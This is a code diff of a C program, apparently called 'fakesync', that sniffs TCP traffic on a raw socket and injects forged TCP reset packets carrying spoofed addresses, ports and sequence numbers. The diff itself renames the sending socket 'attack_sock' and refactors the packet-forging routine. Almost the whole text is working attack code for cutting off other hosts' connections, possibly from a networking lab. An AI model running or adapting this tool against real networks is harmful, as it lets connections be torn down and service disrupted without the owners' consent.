@@ -25,8 +25,8 @@
 
 
 // Constants
-#define DATAGRAMSIZE 1024 // number of bytes for raw datagram
-#define PSEUDOPACKETSIZE 1024 // number of bytes for pseudo packet
+#define DATAGRAMSIZE 100 // number of bytes for raw datagram
+#define PSEUDOPACKETSIZE 100 // number of bytes for pseudo packet
 #define DATAGRAM_MAX 65536 // max number of bytes for IP packets
 
 // Functions
@@ -46,7 +46,7 @@ struct pshdr {
 };
 
 int main(int argc, char *argv[]) {
-    int sockfd, count = 0, num, rv, yes = 1;
+    int sniff_sock, count = 0, num, rv, yes = 1;
     char service_ip[INET6_ADDRSTRLEN];
     uint16_t service_port;
     struct sockaddr_storage saddr;
@@ -87,7 +87,7 @@ int main(int argc, char *argv[]) {
     service_port = htons(service_port);
 
     // Open raw socket
-    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
+    if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
         perror("fakesync: socket\n");
         exit(-1);
     }
@@ -96,7 +96,7 @@ int main(int argc, char *argv[]) {
     while(1) {
         // capture frames
         addr_len = sizeof saddr;
-        if ((num = recvfrom(sockfd, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
+        if ((num = recvfrom(sniff_sock, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
         {
             perror("recvfrom()\n");
             exit(1);
@@ -119,7 +119,7 @@ int main(int argc, char *argv[]) {
     }
 
 final:
-    close(sockfd);
+    close(sniff_sock);
     return 0;
 }
 
@@ -169,8 +169,8 @@ uint16_t ip_checksum(void* vdata,size_t length) {
 void reset(const uint32_t saddr, const uint32_t daddr, 
     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
 {
-    int sockfd, count = 0, num, yes = 1;
-    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
+    int attack_sock, num;
+    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
@@ -179,7 +179,7 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     struct sockaddr_in sa;
 
     // Open raw socket without protocol header
-    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+    if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("fakesync: socket\n");
         exit(-1);
     }
@@ -199,29 +199,21 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     iph -> frag_off = 0x00;
     iph -> ttl = 64; // time to live
     iph -> protocol = IPPROTO_TCP; // TCP
-    iph -> check = 0;
-    iph -> saddr = saddr;
-    iph -> daddr = daddr;
-
     
     // pack TCP header
-    tcph -> source = sport; // source port
-    tcph -> dest = dport; // destination port
-    tcph -> seq = htonl(seq0); // sequence number
-    tcph -> ack_seq = htonl(ack0); // ack sequence number
-    tcph -> res1 = 0;
-    tcph -> res2 = 0;
+    // tcph -> res1 = 0;
+    // tcph -> res2 = 0;
     tcph -> doff = 5; // 5 * 32-bit tcp header
-    tcph -> urg = 0; // urgent flag
-    tcph -> ack = 0;
-    tcph -> psh = 0; // push data immediately
+    // tcph -> urg = 0; // urgent flag
+    // tcph -> ack = 0;
+    // tcph -> psh = 0; // push data immediately
     tcph -> rst = 1;
-    tcph -> syn = 0;
-    tcph -> fin = 0;
+    // tcph -> syn = 0;
+    // tcph -> fin = 0;
     tcph -> window = htons(win); // 16 bits
     tcph -> check = 0; // 16 bits. init to 0.
     tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
-    
+
     // construct psudo packet
     memset(pseudo_packet, 0, sizeof pseudo_packet);
     psh = (struct pshdr *) pseudo_packet;
@@ -229,23 +221,44 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     memcpy(cstcph, (char *)tcph, tcp_len);
 
     // pack pseudo header
-    psh -> src_addr = saddr;
-    psh -> dst_addr = daddr;
     psh -> reserved = 0;
     psh -> protocol = IPPROTO_TCP; // TCP
     psh -> tcp_len = htons(tcp_len); // TCP segment length
 
+    sa.sin_family = AF_INET;
+
+    // dynamic TCP fields
+    tcph -> source = sport; // source port
+    cstcph -> source = sport;
+    tcph -> dest = dport; // destination port
+    cstcph -> dest = dport;
+    tcph -> seq = htonl(seq0); // sequence number
+    cstcph -> seq = htonl(seq0);
+    tcph -> ack_seq = htonl(ack0); // ack sequence number
+    cstcph -> ack_seq = htonl(ack0);
+    if (ack0 > 0) {
+        tcph -> ack = 1;
+        cstcph -> ack = 1;
+    }
+
+    // dynamic pseudo fields
+    psh -> src_addr = saddr;
+    psh -> dst_addr = daddr;
+
     // calculate check sum
     tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); 
 
-    // build sockaddr
-    sa.sin_family = AF_INET;
+    // dynamic IP fields
+    iph -> saddr = saddr;
+    iph -> daddr = daddr;
+
+    // dynamic sockaddr field
     sa.sin_addr.s_addr = daddr;
 
-    if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+    if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
     {
         perror("fakesync: sendto()\n");
     }
 
-    close(sockfd);
+    close(attack_sock);
 }
